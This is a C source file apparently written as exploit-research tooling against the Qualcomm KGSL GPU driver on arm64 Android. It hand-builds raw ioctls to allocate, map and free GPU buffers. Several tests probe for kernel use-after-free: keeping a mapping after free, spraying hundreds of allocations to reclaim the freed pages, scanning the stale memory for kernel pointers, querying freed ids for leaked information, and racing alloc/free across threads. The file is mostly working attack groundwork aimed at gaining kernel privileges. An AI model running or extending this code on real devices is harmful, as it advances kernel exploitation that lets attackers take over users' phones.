/*
 * kgsl_mmap_v2.c — KGSL mmap-after-free with proper signal handling
 *
 * Fixed version: uses sigsetjmp/siglongjmp to survive GPU faults.
 * Tests: basic access, read-after-free, write-after-free, spray-and-reclaim.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o kgsl_mmap_v2 kgsl_mmap_v2.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdint.h>

#define KGSL_IOC_TYPE 0x09

/* Macros for raw ioctl construction */
#define MAKE_IOCTL_RW(nr, sz) (0xC0000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))

/* From Session 8/12: BB Priv uses _IOWR for ALL KGSL ioctls */
/* ALLOC = 48 bytes, FREE = 8 bytes (both _IOWR) */
#define CMD_ALLOC   MAKE_IOCTL_RW(0x34, 48)
#define CMD_FREE    MAKE_IOCTL_RW(0x35, 8)
#define CMD_GETINFO MAKE_IOCTL_RW(0x36, 40)

/* Context create/destroy */
#define CMD_CTX_CREATE  MAKE_IOCTL_RW(0x13, 8)
#define CMD_CTX_DESTROY MAKE_IOCTL_RW(0x14, 4)

static int kgsl_fd = -1;
static sigjmp_buf jmp;
static volatile int caught_sig = 0;

static void sighandler(int sig) {
    caught_sig = sig;
    siglongjmp(jmp, sig);
}

static void install_sighandlers(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sighandler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
    sigaction(SIGFPE, &sa, NULL);
}

/* GPU memory allocation — returns 0 on success */
static int gpu_alloc(unsigned int size_bytes, unsigned int *out_id,
                     unsigned long *out_gpuaddr, size_t *out_mmapsize) {
    unsigned char buf[48] = {0};
    /* offset 4: flags, offset 8: size (size_t = 8 bytes on arm64) */
    *(size_t *)(buf + 8) = size_bytes;

    if (sigsetjmp(jmp, 1) != 0) {
        printf("  CRASH in alloc (sig=%d)\n", caught_sig);
        return -1;
    }

    int ret = ioctl(kgsl_fd, CMD_ALLOC, buf);
    if (ret < 0) return -1;

    if (out_id) *out_id = *(unsigned int *)(buf + 0);
    if (out_gpuaddr) *out_gpuaddr = *(unsigned long *)(buf + 24);
    if (out_mmapsize) *out_mmapsize = *(size_t *)(buf + 16);
    return 0;
}

static int gpu_free(unsigned int id) {
    unsigned char buf[8] = {0};
    *(unsigned int *)buf = id;

    if (sigsetjmp(jmp, 1) != 0) {
        printf("  CRASH in free (sig=%d)\n", caught_sig);
        return -1;
    }
    return ioctl(kgsl_fd, CMD_FREE, buf);
}

static int gpu_getinfo(unsigned int id, unsigned long *out_gpuaddr,
                       size_t *out_size, size_t *out_mmapsize) {
    unsigned char buf[40] = {0};
    *(unsigned int *)(buf + 8) = id;  /* id at offset 8 */

    if (sigsetjmp(jmp, 1) != 0) {
        printf("  CRASH in getinfo (sig=%d)\n", caught_sig);
        return -1;
    }

    int ret = ioctl(kgsl_fd, CMD_GETINFO, buf);
    if (ret < 0) return -1;

    if (out_gpuaddr) *out_gpuaddr = *(unsigned long *)(buf + 0);
    if (out_size) *out_size = *(size_t *)(buf + 16);
    if (out_mmapsize) *out_mmapsize = *(size_t *)(buf + 24);
    return 0;
}

/*========== TEST 1: Can we mmap and access GPU memory? ==========*/
static void test_basic_access(void) {
    printf("\n=== TEST 1: Basic GPU mmap access ===\n");

    unsigned int id;
    unsigned long gpuaddr;
    size_t mmapsize;

    if (gpu_alloc(4096, &id, &gpuaddr, &mmapsize) < 0) {
        printf("  alloc failed: %s\n", strerror(errno));
        return;
    }
    printf("  alloc: id=%u gpuaddr=0x%lx mmapsize=%zu\n", id, gpuaddr, mmapsize);

    size_t mapsz = mmapsize ? mmapsize : 4096;

    /* Try mmap with id*page offset (known working from probe) */
    void *map = mmap(NULL, mapsz, PROT_READ | PROT_WRITE, MAP_SHARED,
                     kgsl_fd, (off_t)id * 4096);
    if (map == MAP_FAILED) {
        /* Try gpuaddr offset */
        map = mmap(NULL, mapsz, PROT_READ | PROT_WRITE, MAP_SHARED,
                   kgsl_fd, (off_t)gpuaddr);
    }
    if (map == MAP_FAILED) {
        printf("  mmap failed: %s\n", strerror(errno));
        gpu_free(id);
        return;
    }
    printf("  mmap at %p (size=%zu)\n", map, mapsz);

    /* Try reading first (safer than writing) */
    if (sigsetjmp(jmp, 1) == 0) {
        volatile unsigned char *p = (volatile unsigned char *)map;
        unsigned char val = p[0];
        printf("  read[0] = 0x%02x (OK)\n", val);

        /* Read first 32 bytes */
        printf("  first 32 bytes: ");
        for (int i = 0; i < 32 && (size_t)i < mapsz; i++)
            printf("%02x ", p[i]);
        printf("\n");
    } else {
        printf("  CRASH on READ (sig=%d) — GPU memory not CPU-accessible\n", caught_sig);
        install_sighandlers();  /* re-install after longjmp */
        munmap(map, mapsz);
        gpu_free(id);
        return;
    }

    /* Try writing */
    if (sigsetjmp(jmp, 1) == 0) {
        volatile unsigned char *p = (volatile unsigned char *)map;
        p[0] = 0x41;
        unsigned char readback = p[0];
        printf("  write 0x41, readback = 0x%02x (%s)\n",
               readback, readback == 0x41 ? "OK" : "MISMATCH");

        /* Fill with pattern */
        memset(map, 0xAA, mapsz);
        int ok = 1;
        for (size_t i = 0; i < mapsz; i++) {
            if (((unsigned char *)map)[i] != 0xAA) { ok = 0; break; }
        }
        printf("  fill+verify: %s\n", ok ? "OK" : "MISMATCH");
    } else {
        printf("  CRASH on WRITE (sig=%d)\n", caught_sig);
        install_sighandlers();
    }

    munmap(map, mapsz);
    gpu_free(id);
    printf("  cleanup OK\n");
}

/*========== TEST 2: mmap-after-free ==========*/
static void test_mmap_after_free(void) {
    printf("\n=== TEST 2: mmap-after-free ===\n");

    /* Do this in a child process for safety */
    pid_t pid = fork();
    if (pid < 0) { printf("  fork failed\n"); return; }

    if (pid == 0) {
        install_sighandlers();

        unsigned int id;
        unsigned long gpuaddr;
        size_t mmapsize;

        if (gpu_alloc(4096, &id, &gpuaddr, &mmapsize) < 0) {
            printf("  alloc failed: %s\n", strerror(errno));
            _exit(1);
        }

        size_t mapsz = mmapsize ? mmapsize : 4096;
        void *map = mmap(NULL, mapsz, PROT_READ | PROT_WRITE, MAP_SHARED,
                         kgsl_fd, (off_t)id * 4096);
        if (map == MAP_FAILED) {
            printf("  mmap failed: %s\n", strerror(errno));
            gpu_free(id);
            _exit(1);
        }
        printf("  mapped: id=%u at %p (size=%zu)\n", id, map, mapsz);

        /* Write marker BEFORE free */
        if (sigsetjmp(jmp, 1) == 0) {
            memset(map, 0xAA, mapsz);
            printf("  wrote 0xAA marker\n");
        } else {
            printf("  CRASH writing marker (sig=%d)\n", caught_sig);
            install_sighandlers();
            _exit(2);
        }

        /* FREE but keep mapping */
        int ret = gpu_free(id);
        printf("  freed id=%u: %s\n", id, ret == 0 ? "OK" : strerror(errno));

        /* Read from stale mapping */
        if (sigsetjmp(jmp, 1) == 0) {
            volatile unsigned char *p = (volatile unsigned char *)map;
            unsigned char val = p[0];
            printf("  post-free read[0] = 0x%02x (expected 0xAA)\n", val);

            /* Check for data changes */
            int changed = 0;
            for (size_t i = 0; i < mapsz; i++) {
                if (p[i] != 0xAA) { changed = i + 1; break; }
            }

            if (changed) {
                printf("  >>> DATA CHANGED at byte %d after free! <<<\n", changed - 1);
                printf("  first 64 bytes post-free:\n  ");
                for (int i = 0; i < 64 && (size_t)i < mapsz; i++) {
                    printf("%02x ", p[i]);
                    if ((i + 1) % 16 == 0) printf("\n  ");
                }
                printf("\n");

                /* Check for kernel pointers */
                for (size_t i = 0; i < mapsz - 7; i += 8) {
                    uint64_t v;
                    memcpy(&v, (void *)(p + i), 8);
                    if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL ||
                        (v & 0xFFFFFF0000000000ULL) == 0xffffff8000000000ULL) {
                        printf("  >>> KERNEL PTR at +%zu: 0x%016llx <<<\n",
                               i, (unsigned long long)v);
                    }
                }
            } else {
                printf("  data still 0xAA — mapping not invalidated but unchanged\n");
            }
        } else {
            printf("  CRASH reading stale mapping (sig=%d)\n", caught_sig);
            install_sighandlers();
        }

        /* Spray new allocations to try to reclaim the pages */
        printf("  spraying 256 new GPU buffers...\n");
        unsigned int new_ids[256];
        int sprayed = 0;
        for (int i = 0; i < 256; i++) {
            unsigned long ga;
            size_t ms;
            if (gpu_alloc(4096, &new_ids[i], &ga, &ms) == 0) {
                sprayed++;
            } else break;
        }
        printf("  sprayed %d buffers\n", sprayed);

        /* Check stale mapping again */
        if (sigsetjmp(jmp, 1) == 0) {
            volatile unsigned char *p = (volatile unsigned char *)map;
            int changed = 0;
            for (size_t i = 0; i < mapsz; i++) {
                if (p[i] != 0xAA) { changed = i + 1; break; }
            }

            if (changed) {
                printf("  >>> STALE MAPPING DATA CHANGED AFTER SPRAY! <<<\n");
                printf("  first 64 bytes:\n  ");
                for (int i = 0; i < 64 && (size_t)i < mapsz; i++) {
                    printf("%02x ", p[i]);
                    if ((i + 1) % 16 == 0) printf("\n  ");
                }
                printf("\n");

                for (size_t i = 0; i < mapsz - 7; i += 8) {
                    uint64_t v;
                    memcpy(&v, (void *)(p + i), 8);
                    if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL) {
                        printf("  >>> KERNEL PTR at +%zu: 0x%016llx <<<\n",
                               i, (unsigned long long)v);
                    }
                }
                _exit(42);  /* UAF detected */
            } else {
                printf("  stale mapping unchanged after spray\n");
            }
        } else {
            printf("  CRASH reading after spray (sig=%d)\n", caught_sig);
            install_sighandlers();
        }

        /* Cleanup */
        for (int i = 0; i < sprayed; i++) gpu_free(new_ids[i]);
        munmap(map, mapsz);
        _exit(0);
    }

    alarm(15);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        printf("  result: %s (exit=%d)\n",
               code == 42 ? "UAF DETECTED!" : code == 0 ? "no UAF" : "error", code);
    } else if (WIFSIGNALED(status)) {
        printf("  child killed by signal %d\n", WTERMSIG(status));
    }
}

/*========== TEST 3: Info leak after free ==========*/
static void test_info_after_free(void) {
    printf("\n=== TEST 3: Info leak after free ===\n");

    unsigned int ids[8];
    unsigned long gpuaddrs[8];
    size_t sizes[8];

    for (int i = 0; i < 8; i++) {
        size_t ms;
        if (gpu_alloc(4096 * (i + 1), &ids[i], &gpuaddrs[i], &ms) < 0) {
            printf("  alloc %d failed\n", i);
            for (int j = 0; j < i; j++) gpu_free(ids[j]);
            return;
        }
    }
    printf("  allocated 8 buffers (ids %u-%u)\n", ids[0], ids[7]);

    /* Free even-numbered buffers */
    for (int i = 0; i < 8; i += 2) {
        gpu_free(ids[i]);
    }
    printf("  freed ids: %u, %u, %u, %u\n", ids[0], ids[2], ids[4], ids[6]);

    /* Try to get info on all (freed and live) */
    for (int i = 0; i < 8; i++) {
        unsigned long ga;
        size_t sz, ms;
        int ret = gpu_getinfo(ids[i], &ga, &sz, &ms);
        int is_freed = (i % 2 == 0);
        if (ret == 0) {
            printf("  id=%u: gpuaddr=0x%lx size=%zu mmapsize=%zu%s\n",
                   ids[i], ga, sz, ms,
                   is_freed ? " <<< FREED! INFO LEAK!" : "");
        } else {
            printf("  id=%u: %s%s\n", ids[i], strerror(errno),
                   is_freed ? " (expected — freed)" : " <<< LIVE BUT ERROR!");
        }
    }

    /* Cleanup */
    for (int i = 1; i < 8; i += 2) gpu_free(ids[i]);
}

/*========== TEST 4: Different allocation sizes ==========*/
static void test_various_sizes(void) {
    printf("\n=== TEST 4: Allocation size probing ===\n");

    unsigned int sizes[] = { 4096, 8192, 16384, 65536, 262144, 1048576, 4194304 };
    int nsizes = sizeof(sizes) / sizeof(sizes[0]);

    for (int i = 0; i < nsizes; i++) {
        unsigned int id;
        unsigned long gpuaddr;
        size_t mmapsize;

        if (gpu_alloc(sizes[i], &id, &gpuaddr, &mmapsize) == 0) {
            printf("  %7u bytes: id=%u gpuaddr=0x%lx mmapsize=%zu\n",
                   sizes[i], id, gpuaddr, mmapsize);

            /* Try mmap */
            void *map = mmap(NULL, mmapsize ? mmapsize : sizes[i],
                             PROT_READ | PROT_WRITE, MAP_SHARED,
                             kgsl_fd, (off_t)id * 4096);
            if (map != MAP_FAILED) {
                if (sigsetjmp(jmp, 1) == 0) {
                    volatile unsigned char *p = (volatile unsigned char *)map;
                    p[0] = 0x42;
                    printf("    mmap+write OK at %p\n", map);
                } else {
                    printf("    mmap OK but access CRASH (sig=%d)\n", caught_sig);
                    install_sighandlers();
                }
                munmap(map, mmapsize ? mmapsize : sizes[i]);
            } else {
                printf("    mmap failed: %s\n", strerror(errno));
            }
            gpu_free(id);
        } else {
            printf("  %7u bytes: alloc failed (%s)\n", sizes[i], strerror(errno));
        }
    }
}

/*========== TEST 5: Rapid alloc/free race ==========*/
static volatile int race_stop = 0;
static volatile int race_crashes = 0;

static void *race_thread(void *arg) {
    install_sighandlers();
    int count = 0;
    while (!race_stop) {
        unsigned int id;
        unsigned long ga;
        size_t ms;
        if (sigsetjmp(jmp, 1) == 0) {
            if (gpu_alloc(4096, &id, &ga, &ms) == 0) {
                count++;
                gpu_free(id);
            }
        } else {
            race_crashes++;
            install_sighandlers();
        }
        usleep(10);
    }
    printf("  race thread: %d cycles, %d crashes\n", count, race_crashes);
    return NULL;
}

static void test_race(void) {
    printf("\n=== TEST 5: Alloc/free race (3 seconds) ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        install_sighandlers();
        race_stop = 0;
        race_crashes = 0;
        pthread_t t[4];
        for (int i = 0; i < 4; i++)
            pthread_create(&t[i], NULL, race_thread, NULL);
        sleep(3);
        race_stop = 1;
        for (int i = 0; i < 4; i++)
            pthread_join(t[i], NULL);
        printf("  total race crashes: %d\n", race_crashes);
        _exit(race_crashes > 0 ? 1 : 0);
    }

    alarm(10);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  result: %s\n", WEXITSTATUS(status) == 0 ? "clean" : "crashes detected");
    else if (WIFSIGNALED(status))
        printf("  >>> CRASH signal %d <<<\n", WTERMSIG(status));
}

/*========== TEST 6: Large spray + stale mmap read ==========*/
static void test_large_spray_uaf(void) {
    printf("\n=== TEST 6: Large spray + stale mapping scan ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        install_sighandlers();

        /* Allocate a target buffer */
        unsigned int target_id;
        unsigned long target_ga;
        size_t target_ms;

        if (gpu_alloc(65536, &target_id, &target_ga, &target_ms) < 0) {
            printf("  target alloc failed\n");
            _exit(1);
        }

        size_t mapsz = target_ms ? target_ms : 65536;
        void *map = mmap(NULL, mapsz, PROT_READ | PROT_WRITE, MAP_SHARED,
                         kgsl_fd, (off_t)target_id * 4096);
        if (map == MAP_FAILED) {
            printf("  target mmap failed\n");
            gpu_free(target_id);
            _exit(1);
        }

        /* Write recognizable pattern */
        if (sigsetjmp(jmp, 1) == 0) {
            memset(map, 0xCC, mapsz);
        } else {
            printf("  CRASH writing to 64KB target (sig=%d)\n", caught_sig);
            install_sighandlers();
            _exit(2);
        }

        /* Free the target */
        gpu_free(target_id);
        printf("  freed 64KB target (id=%u), mapping at %p persists\n", target_id, map);

        /* Heavy spray with different sizes to cause page reclaim */
        unsigned int spray_ids[512];
        int sprayed = 0;
        for (int i = 0; i < 512; i++) {
            unsigned long ga;
            size_t ms;
            unsigned int sz = 4096 * ((i % 16) + 1);  /* Vary sizes 4K-64K */
            if (gpu_alloc(sz, &spray_ids[i], &ga, &ms) == 0) {
                sprayed++;
            } else break;
        }
        printf("  sprayed %d buffers (various sizes)\n", sprayed);

        /* Scan stale mapping for changes */
        int uaf_detected = 0;
        if (sigsetjmp(jmp, 1) == 0) {
            volatile unsigned char *p = (volatile unsigned char *)map;
            int first_change = -1;

            for (size_t i = 0; i < mapsz; i++) {
                if (p[i] != 0xCC) {
                    if (first_change < 0) first_change = i;
                }
            }

            if (first_change >= 0) {
                uaf_detected = 1;
                printf("  >>> UAF: stale mapping changed at byte %d! <<<\n", first_change);
                printf("  dump at change point:\n  ");
                for (int i = first_change; i < first_change + 64 && (size_t)i < mapsz; i++) {
                    printf("%02x ", p[i]);
                    if ((i - first_change + 1) % 16 == 0) printf("\n  ");
                }
                printf("\n");

                /* Scan for kernel pointers */
                for (size_t i = 0; i < mapsz - 7; i += 8) {
                    uint64_t v;
                    memcpy(&v, (void *)(p + i), 8);
                    if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL) {
                        printf("  KERNEL PTR at +%zu: 0x%016llx\n", i, (unsigned long long)v);
                    }
                }
            } else {
                printf("  stale mapping still 0xCC — no reclaim into GPU pages\n");
            }
        } else {
            printf("  CRASH scanning stale mapping (sig=%d)\n", caught_sig);
            install_sighandlers();
        }

        /* Cleanup */
        for (int i = 0; i < sprayed; i++) gpu_free(spray_ids[i]);
        munmap(map, mapsz);
        _exit(uaf_detected ? 42 : 0);
    }

    alarm(30);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        printf("  result: %s\n",
               code == 42 ? "UAF DETECTED!" : code == 0 ? "no UAF" : "error");
    } else if (WIFSIGNALED(status)) {
        printf("  child killed signal %d\n", WTERMSIG(status));
    }
}

int main(void) {
    printf("=== KGSL MMAP V2 — Signal-safe UAF testing ===\n");
    printf("uid=%u\n", getuid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("KGSL open failed: %s\n", strerror(errno));
        return 1;
    }
    printf("KGSL fd=%d\n", kgsl_fd);

    install_sighandlers();

    /* Verify basic ioctls work */
    unsigned int test_id;
    unsigned long test_ga;
    size_t test_ms;
    if (gpu_alloc(4096, &test_id, &test_ga, &test_ms) < 0) {
        printf("FATAL: ALLOC ioctl failed: %s\n", strerror(errno));
        close(kgsl_fd);
        return 1;
    }
    printf("ALLOC works: id=%u gpuaddr=0x%lx mmapsize=%zu\n", test_id, test_ga, test_ms);
    gpu_free(test_id);
    printf("FREE works\n\n");

    test_basic_access();
    test_mmap_after_free();
    test_info_after_free();
    test_various_sizes();
    test_race();
    test_large_spray_uaf();

    close(kgsl_fd);
    printf("\n=== ALL KGSL V2 TESTS COMPLETE ===\n");
    return 0;
}
